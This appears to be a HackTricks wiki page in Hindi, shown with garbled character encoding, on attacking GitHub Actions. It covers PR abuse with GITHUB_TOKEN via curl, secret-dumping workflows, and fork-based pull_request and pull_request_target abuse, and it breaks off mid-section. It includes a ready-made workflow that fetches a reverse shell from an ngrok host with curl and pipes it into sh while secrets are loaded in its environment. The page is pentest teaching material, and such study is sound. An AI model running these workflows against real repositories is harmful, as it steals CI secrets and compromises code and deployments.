# Github Actions рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ

{% hint style="success" %}
AWS Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking рд╕реАрдЦреЗрдВ рдФрд░ рдЕрднреНрдпрд╛рд╕ рдХрд░реЗрдВ: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks рдХреЛ рд╕рдорд░реНрдерди рджреЗрдВ</summary>

* [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдУрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдБрдЪ рдХрд░реЗрдВ!
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** ЁЯТм [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**telegram рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ **рд╣рдореЗрдВ** **Twitter** ЁЯРж рдкрд░ **рдлреЙрд▓реЛ рдХрд░реЗрдВ** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ** [**HackTricks**](https://github.com/carlospolop/hacktricks) рдФрд░ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos рдореЗрдВред

</details>
{% endhint %}

## рдмреБрдирд┐рдпрд╛рджреА рдЬрд╛рдирдХрд╛рд░реА

рдЗрд╕ рдкреЗрдЬ рдореЗрдВ рдЖрдкрдХреЛ рдорд┐рд▓реЗрдЧрд╛:

* рдПрдХ **рд╕рд╛рд░рд╛рдВрд╢ рд╕рднреА рдкреНрд░рднрд╛рд╡реЛрдВ** рдХрд╛ рдЬрдм рдПрдХ рд╣рдорд▓рд╛рд╡рд░ Github Action рддрдХ рдкрд╣реБрдБрдЪ рдЬрд╛рддрд╛ рд╣реИ
* **рдПрдХреНрд╢рди рддрдХ рдкрд╣реБрдБрдЪрдиреЗ рдХреЗ рд╡рд┐рднрд┐рдиреНрди рддрд░реАрдХреЗ**:
* рдПрдХреНрд╢рди рдмрдирд╛рдиреЗ рдХреЗ рд▓рд┐рдП **рдЕрдиреБрдорддрд┐рдпрд╛рдБ** рд╣реЛрдирд╛
* **pull request** рд╕рдВрдмрдВрдзрд┐рдд рдЯреНрд░рд┐рдЧрд░реНрд╕ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ
* **рдЕрдиреНрдп рдмрд╛рд╣рд░реА рдкрд╣реБрдБрдЪ** рддрдХрдиреАрдХреЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ
* рдкрд╣рд▓реЗ рд╕реЗ рд╕рдордЭреМрддрд╛ рдХрд┐рдП рдЧрдП repo рд╕реЗ **рдкрд┐рд╡реЛрдЯрд┐рдВрдЧ**
* рдЕрдВрдд рдореЗрдВ, **рдкреЛрд╕реНрдЯ-рдПрдХреНрд╕рдкреНрд▓реЙрдЗрдЯреЗрд╢рди рддрдХрдиреАрдХреЛрдВ** рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдПрдХ рдЕрдиреБрднрд╛рдЧ рдЬреЛ рдЕрдВрджрд░ рд╕реЗ рдПрдХреНрд╢рди рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рд╣реИ (рдЙрд▓реНрд▓реЗрдЦрд┐рдд рдкреНрд░рднрд╛рд╡реЛрдВ рдХрд╛ рдХрд╛рд░рдг)

## рдкреНрд░рднрд╛рд╡реЛрдВ рдХрд╛ рд╕рд╛рд░рд╛рдВрд╢

[**Github Actions рдХреА рдореВрд▓ рдЬрд╛рдирдХрд╛рд░реА**](../basic-github-information.md#github-actions) рдХреЗ рдмрд╛рд░реЗ рдореЗрдВ рдкрд░рд┐рдЪрдп рдХреЗ рд▓рд┐рдП рджреЗрдЦреЗрдВред

рдпрджрд┐ рдЖрдк **рдордирдорд╛рдиреЗ Github actions рдирд┐рд╖реНрдкрд╛рджрд┐рдд/рдХреЛрдб рдЗрдВрдЬреЗрдХреНрдЯ** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдПрдХ **repository** рдореЗрдВ, рддреЛ рдЖрдк рд╕рдХреНрд╖рдо рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ:

* рдЙрд╕ repo/organization рд╕реЗ **secrets** **рдЪреЛрд░реА** рдХрд░рдирд╛ред
* рдпрджрд┐ рдЖрдк рдХреЗрд╡рд▓ рдЗрдВрдЬреЗрдХреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк рдЬреЛ рднреА рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рдореМрдЬреВрдж рд╣реИ рдЙрд╕реЗ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВред
* **repo privileges** рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЕрдиреНрдп рдкреНрд▓реЗрдЯрдлрд╛рд░реНрдореЛрдВ рдЬреИрд╕реЗ AWS рдФрд░ GCP рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВред
* **рдХрд╕реНрдЯрдо рд╡рд░реНрдХрд░реНрд╕ рдореЗрдВ рдХреЛрдб рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░реЗрдВ (рдпрджрд┐ рдХрд╕реНрдЯрдо рд╡рд░реНрдХрд░реНрд╕ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ) рдФрд░ рд╡рд╣рд╛рдВ рд╕реЗ рдкрд┐рд╡реЛрдЯ рдХрд░рдиреЗ рдХрд╛ рдкреНрд░рдпрд╛рд╕ рдХрд░реЗрдВред
* repository **рдХреЛрдб** рдХреЛ **рдУрд╡рд░рд░рд╛рдЗрдЯ** рдХрд░реЗрдВред
* рдпрд╣ `GITHUB_TOKEN` (рдпрджрд┐ рдХреЛрдИ рд╣реЛ) рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИред
* **рдбрд┐рдкреНрд▓реЙрдпрдореЗрдВрдЯреНрд╕** рдФрд░ рдЕрдиреНрдп **рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯреНрд╕** рдХреЛ **рд╕рдордЭреМрддрд╛** рдХрд░реЗрдВред
* рдпрджрд┐ рдХреЛрдб рдХреБрдЫ рддреИрдирд╛рдд рдпрд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд░ рд░рд╣рд╛ рд╣реИ рддреЛ рдЖрдк рдЙрд╕реЗ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдХреБрдЫ рдФрд░ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

## GITHUB\_TOKEN

рдпрд╣ "**secret**" (рдЬреЛ `${{ secrets.GITHUB_TOKEN }}` рдФрд░ `${{ github.token }}` рд╕реЗ рдЖрддрд╛ рд╣реИ) рддрдм рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрдм рдПрдбрдорд┐рди рдЗрд╕ рд╡рд┐рдХрд▓реНрдк рдХреЛ рд╕рдХреНрд╖рдо рдХрд░рддрд╛ рд╣реИ:

<figure><img src="../../../.gitbook/assets/image (86).png" alt=""><figcaption></figcaption></figure>

рдпрд╣ рдЯреЛрдХрди рд╡рд╣реА рд╣реИ рдЬреЛ рдПрдХ **Github Application рдЙрдкрдпреЛрдЧ рдХрд░реЗрдЧрд╛**, рдЗрд╕рд▓рд┐рдП рдпрд╣ рдЙрдиреНрд╣реАрдВ endpoints рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддрд╛ рд╣реИ: [https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps](https://docs.github.com/en/rest/overview/endpoints-available-for-github-apps)

{% hint style="warning" %}
Github рдХреЛ рдПрдХ [**flow**](https://github.com/github/roadmap/issues/74) рдЬрд╛рд░реА рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рдЬреЛ **рдХреНрд░реЙрд╕-рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА** рдкрд╣реБрдБрдЪ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ GitHub рдХреЗ рднреАрддрд░, рддрд╛рдХрд┐ рдПрдХ repo рдЕрдиреНрдп рдЖрдВрддрд░рд┐рдХ repos рддрдХ `GITHUB_TOKEN` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкрд╣реБрдБрдЪ рд╕рдХреЗред
{% endhint %}

рдЖрдк рдЗрд╕ рдЯреЛрдХрди рдХреЗ рд╕рдВрднрд╛рд╡рд┐рдд **рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдХреЛ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ: [https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token](https://docs.github.com/en/actions/security-guides/automatic-token-authentication#permissions-for-the-github\_token)

рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдЯреЛрдХрди **рдЬреЙрдм рдкреВрд░рд╛ рд╣реЛрдиреЗ рдХреЗ рдмрд╛рдж рд╕рдорд╛рдкреНрдд рд╣реЛ рдЬрд╛рддрд╛ рд╣реИ**ред\
рдпреЗ рдЯреЛрдХрди рдЗрд╕ рддрд░рд╣ рджрд┐рдЦрддреЗ рд╣реИрдВ: `ghs_veaxARUji7EXszBMbhkr4Nz2dYz0sqkeiur7`

рдЗрд╕ рдЯреЛрдХрди рдХреЗ рд╕рд╛рде рдЖрдк рдХреБрдЫ рджрд┐рд▓рдЪрд╕реНрдк рдЪреАрдЬреЗрдВ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:

{% tabs %}
{% tab title="Merge PR" %}
```bash
# Merge PR
curl -X PUT \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/merge \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"commit_title":"commit_title"}'
```
{% endtab %}

{% tab title="Approve PR" %}

{% endtab %}
```bash
# Approve a PR
curl -X POST \
https://api.github.com/repos/<org_name>/<repo_name>/pulls/<pr_number>/reviews \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
-d '{"event":"APPROVE"}'
```
{% endtab %}

{% tab title="Create PR" %}
```bash
# Create a PR
curl -X POST \
-H "Accept: application/vnd.github.v3+json" \
--header "authorization: Bearer $GITHUB_TOKEN" \
--header 'content-type: application/json' \
https://api.github.com/repos/<org_name>/<repo_name>/pulls \
-d '{"head":"<branch_name>","base":"master", "title":"title"}'
```
{% endtab %}
{% endtabs %}

{% hint style="danger" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрдИ рдореМрдХреЛрдВ рдкрд░ рдЖрдк **Github Actions envs рдпрд╛ secrets рдХреЗ рдЕрдВрджрд░ github user tokens** рдкрд╛ рд╕рдХрддреЗ рд╣реИрдВред рдпреЗ tokens рдЖрдкрдХреЛ repository рдФрд░ organization рдкрд░ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

<details>

<summary>Github Action output рдореЗрдВ secrets рд╕реВрдЪреАрдмрджреНрдз рдХрд░реЗрдВ</summary>
```yaml
name: list_env
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
List_env:
runs-on: ubuntu-latest
steps:
- name: List Env
# Need to base64 encode or github will change the secret value for "***"
run: sh -c 'env | grep "secret_" | base64 -w0'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

<details>

<summary>рд╕реАрдХреНрд░реЗрдЯреНрд╕ рдХреЗ рд╕рд╛рде рд░рд┐рд╡рд░реНрд╕ рд╢реЗрд▓ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ</summary>
```yaml
name: revshell
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- '**'
push: # Run it when a push is made to a branch
branches:
- '**'
jobs:
create_pull_request:
runs-on: ubuntu-latest
steps:
- name: Get Rev Shell
run: sh -c 'curl https://reverse-shell.sh/2.tcp.ngrok.io:15217 | sh'
env:
secret_myql_pass: ${{secrets.MYSQL_PASSWORD}}
secret_postgress_pass: ${{secrets.POSTGRESS_PASSWORDyaml}}
```
</details>

рдЕрдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЗ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ Github Token рдХреЛ рджрд┐рдП рдЧрдП рдЕрдиреБрдорддрд┐рдпреЛрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ **рдПрдХреНрд╢рди рдХреЗ рд▓реЙрдЧреНрд╕ рдХреА рдЬрд╛рдВрдЪ рдХрд░рдХреЗ**:

<figure><img src="../../../.gitbook/assets/image (286).png" alt="" width="269"><figcaption></figcaption></figure>

## Allowed Execution

{% hint style="info" %}
рдпрд╣ Github actions рдХреЛ рд╕рдордЭреМрддрд╛ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЖрд╕рд╛рди рддрд░реАрдХрд╛ рд╣реЛрдЧрд╛, рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕ рдорд╛рдорд▓реЗ рдореЗрдВ рдорд╛рди рд▓рд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдХрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ **рд╕рдВрдЧрдарди рдореЗрдВ рдПрдХ рдирдпрд╛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдмрдирд╛рдиреЗ рдХреА рдкрд╣реБрдВрдЪ** рд╣реИ, рдпрд╛ **рдХрд┐рд╕реА рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдкрд░ рд▓рд┐рдЦрдиреЗ рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░** рд╣реИрдВред

рдпрджрд┐ рдЖрдк рдЗрд╕ рд╕реНрдерд┐рддрд┐ рдореЗрдВ рд╣реИрдВ рддреЛ рдЖрдк рдмрд╕ [Post Exploitation techniques](./#post-exploitation-techniques-from-inside-an-action) рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
{% endhint %}

### Repo Creation рд╕реЗ Execution

рдпрджрд┐ рд╕рдВрдЧрдарди рдХреЗ рд╕рджрд╕реНрдп **рдирдП рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ** рдФрд░ рдЖрдк github actions рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЖрдк **рдПрдХ рдирдпрд╛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рд╕рдВрдЧрдарди рд╕реНрддрд░ рдкрд░ рд╕реЗрдЯ рдХрд┐рдП рдЧрдП secrets рдХреЛ рдЪреБрд░рд╛ рд╕рдХрддреЗ рд╣реИрдВ**ред

### рдПрдХ рдирдИ Branch рд╕реЗ Execution

рдпрджрд┐ рдЖрдк **рдХрд┐рд╕реА рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдореЗрдВ рдПрдХ рдирдИ рд╢рд╛рдЦрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд┐рд╕рдореЗрдВ рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рдПрдХ Github Action** рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ **рд╕рдВрд╢реЛрдзрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, **рд╕рд╛рдордЧреНрд░реА рдЕрдкрд▓реЛрдб** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдлрд┐рд░ **рдирдИ рд╢рд╛рдЦрд╛ рд╕реЗ рдЙрд╕ рдПрдХреНрд╢рди рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд** рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕ рддрд░рд╣ рдЖрдк **рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдФрд░ рд╕рдВрдЧрдарди рд╕реНрддрд░ рдХреЗ secrets рдХреЛ рдмрд╛рд╣рд░ рдирд┐рдХрд╛рд▓ рд╕рдХрддреЗ рд╣реИрдВ** (рд▓реЗрдХрд┐рди рдЖрдкрдХреЛ рдпрд╣ рдЬрд╛рдирдирд╛ рд╣реЛрдЧрд╛ рдХрд┐ рдЙрдиреНрд╣реЗрдВ рдХреИрд╕реЗ рдХрд╣рд╛ рдЬрд╛рддрд╛ рд╣реИ)ред

рдЖрдк рд╕рдВрд╢реЛрдзрд┐рдд рдПрдХреНрд╢рди рдХреЛ **рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ,** рдЬрдм рдПрдХ **PR рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** рдпрд╛ рдЬрдм **рдХреБрдЫ рдХреЛрдб рдкреБрд╢ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ** (рдЗрд╕ рдкрд░ рдирд┐рд░реНрднрд░ рдХрд░рддрд╛ рд╣реИ рдХрд┐ рдЖрдк рдХрд┐рддрдирд╛ рд╢реЛрд░ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ) рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```yaml
on:
workflow_dispatch: # Launch manually
pull_request: #Run it when a PR is created to a branch
branches:
- master
push: # Run it when a push is made to a branch
branches:
- current_branch_name

# Use '**' instead of a branh name to trigger the action in all the cranches
```
***

## Forked Execution

{% hint style="info" %}
рдЕрд▓рдЧ-рдЕрд▓рдЧ рдЯреНрд░рд┐рдЧрд░реНрд╕ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдХреЛ **рдХрд┐рд╕реА рдЕрдиреНрдп рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреА Github Action рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВред рдпрджрд┐ рд╡реЗ рдЯреНрд░рд┐рдЧрд░ рдХрд░рдиреЗ рдпреЛрдЧреНрдп рдХреНрд░рд┐рдпрд╛рдПрдВ рдЦрд░рд╛рдм рддрд░реАрдХреЗ рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЧрдИ рд╣реИрдВ, рддреЛ рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрдиреНрд╣реЗрдВ рд╕рдордЭреМрддрд╛ рдХрд░ рд╕рдХрддрд╛ рд╣реИред
{% endhint %}

### `pull_request`

рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдЯреНрд░рд┐рдЧрд░ **`pull_request`** рд╣рд░ рдмрд╛рд░ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдЧрд╛ рдЬрдм рдХреЛрдИ рдкреБрд▓ рдЕрдиреБрд░реЛрдз рдкреНрд░рд╛рдкреНрдд рд╣реЛрддрд╛ рд╣реИ рдХреБрдЫ рдЕрдкрд╡рд╛рджреЛрдВ рдХреЗ рд╕рд╛рде: рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ рдпрджрд┐ рдпрд╣ **рдкрд╣рд▓реА рдмрд╛рд░** рд╣реИ рдЬрдм рдЖрдк **рд╕рд╣рдпреЛрдЧ рдХрд░ рд░рд╣реЗ рд╣реИрдВ**, рддреЛ рдХреБрдЫ **рд░рдЦрд░рдЦрд╛рд╡рдХрд░реНрддрд╛** рдХреЛ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдХреЗ **рд░рди** рдХреЛ **рд╕реНрд╡реАрдХреГрдд** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрдЧреА:

<figure><img src="../../../.gitbook/assets/image (184).png" alt=""><figcaption></figcaption></figure>

{% hint style="info" %}
рдЪреВрдВрдХрд┐ **рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд╕реАрдорд╛** **рдкрд╣рд▓реА рдмрд╛рд░** рдпреЛрдЧрджрд╛рдирдХрд░реНрддрд╛рдУрдВ рдХреЗ рд▓рд┐рдП рд╣реИ, рдЖрдк **рдПрдХ рд╡реИрдз рдмрдЧ/рдЯрд╛рдЗрдкреЛ рдХреЛ рдареАрдХ рдХрд░рдиреЗ** рдореЗрдВ рдпреЛрдЧрджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдлрд┐рд░ **рдЕрдкрдиреЗ рдирдП `pull_request` рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЕрдиреНрдп PRs рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ**ред

**рдореИрдВрдиреЗ рдЗрд╕рдХрд╛ рдкрд░реАрдХреНрд╖рдг рдХрд┐рдпрд╛ рдФрд░ рдпрд╣ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддрд╛**: ~~рдПрдХ рдФрд░ рд╡рд┐рдХрд▓реНрдк рдпрд╣ рд╣реЛрдЧрд╛ рдХрд┐ рдХрд┐рд╕реА рдРрд╕реЗ рд╡реНрдпрдХреНрддрд┐ рдХреЗ рдирд╛рдо рд╕реЗ рдЦрд╛рддрд╛ рдмрдирд╛рдпрд╛ рдЬрд╛рдП рдЬрд┐рд╕рдиреЗ рдкреНрд░реЛрдЬреЗрдХреНрдЯ рдореЗрдВ рдпреЛрдЧрджрд╛рди рджрд┐рдпрд╛ рд╣реЛ рдФрд░ рдЕрдкрдирд╛ рдЦрд╛рддрд╛ рд╣рдЯрд╛ рджрд┐рдпрд╛ рд╣реЛред~~
{% endhint %}

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐рдпреЛрдВ** рдФрд░ рд▓рдХреНрд╖рд┐рдд рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рддрдХ **рдЧреБрдкреНрдд рдкрд╣реБрдВрдЪ** рдХреЛ рд░реЛрдХрддрд╛ рд╣реИ рдЬреИрд╕рд╛ рдХрд┐ [**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ**](https://docs.github.com/en/actions/using-workflows/events-that-trigger-workflows#workflows-in-forked-repositories) рдореЗрдВ рдЙрд▓реНрд▓реЗрдЦ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ:

> `GITHUB_TOKEN` рдХреЛ рдЫреЛрдбрд╝рдХрд░, **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рд░рдирд░ рдХреЛ рдкрд╛рд╕ рдирд╣реАрдВ рдХреА рдЬрд╛рддреА** рдЬрдм рд╡рд░реНрдХрдлрд╝реНрд▓реЛ **рдлреЛрд░реНрдХ рдХреА рдЧрдИ** рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ рдЯреНрд░рд┐рдЧрд░ рд╣реЛрддрд╛ рд╣реИред рдкреБрд▓ рдЕрдиреБрд░реЛрдзреЛрдВ рдореЗрдВ **`GITHUB_TOKEN` рдХреЗ рдкрд╛рд╕ рдХреЗрд╡рд▓ рдкрдврд╝рдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рд╣реЛрддреА рд╣реИ **рдлреЛрд░реНрдХ рдХреА рдЧрдИ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рд╕реЗ**ред

рдПрдХ рд╣рдорд▓рд╛рд╡рд░ Github Action рдХреА рдкрд░рд┐рднрд╛рд╖рд╛ рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░ рд╕рдХрддрд╛ рд╣реИ рддрд╛рдХрд┐ рдордирдорд╛рдиреА рдЪреАрдЬреЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреА рдЬрд╛ рд╕рдХреЗрдВ рдФрд░ рдордирдорд╛рдиреА рдХреНрд░рд┐рдпрд╛рдПрдВ рдЬреЛрдбрд╝реА рдЬрд╛ рд╕рдХреЗрдВред рд╣рд╛рд▓рд╛рдБрдХрд┐, рд╡рд╣ рдЙрд▓реНрд▓рд┐рдЦрд┐рдд рд╕реАрдорд╛рдУрдВ рдХреЗ рдХрд╛рд░рдг рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдЪреБрд░рд╛ рдирд╣реАрдВ рд╕рдХреЗрдЧрд╛ рдпрд╛ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЛ рдЕрдзрд┐рд▓реЗрдЦрд┐рдд рдирд╣реАрдВ рдХрд░ рд╕рдХреЗрдЧрд╛ред

{% hint style="danger" %}
**рд╣рд╛рдВ, рдпрджрд┐ рд╣рдорд▓рд╛рд╡рд░ PR рдореЗрдВ рдЯреНрд░рд┐рдЧрд░ рдХреА рдЬрд╛рдиреЗ рд╡рд╛рд▓реА github action рдХреЛ рдмрджрд▓рддрд╛ рд╣реИ, рддреЛ рдЙрд╕рдХреА Github Action рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛ рди рдХрд┐ рдореВрд▓ рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреА!**
{% endhint %}

рдЪреВрдВрдХрд┐ рд╣рдорд▓рд╛рд╡рд░ рднреА рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рднрд▓реЗ рд╣реА `GITHUB_TOKEN` рдкрд░ рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рдпрд╛ рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рди рд╣реЛ, рдПрдХ рд╣рдорд▓рд╛рд╡рд░ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдЖрд░реНрдЯрд┐рдлреИрдХреНрдЯ рдЕрдкрд▓реЛрдб** рдХрд░ рд╕рдХрддрд╛ рд╣реИред

### **`pull_request_target`**

рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдЯреНрд░рд┐рдЧрд░ **`pull_request_target`** рдХреЗ рдкрд╛рд╕ рд▓рдХреНрд╖рд┐рдд рд░рд┐рдкреЙрдЬрд┐рдЯрд░реА рдХреЗ рд▓рд┐рдП **рд▓рд┐рдЦрдиреЗ рдХреА рдЕрдиреБрдорддрд┐** рдФрд░ **рдЧреБрдкреНрдд рдЬрд╛рдирдХрд╛рд░реА рддрдХ рдкрд╣реБрдВрдЪ** рд╣реИ (рдФрд░ рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рдорд╛рдВрдЧрддрд╛)ред

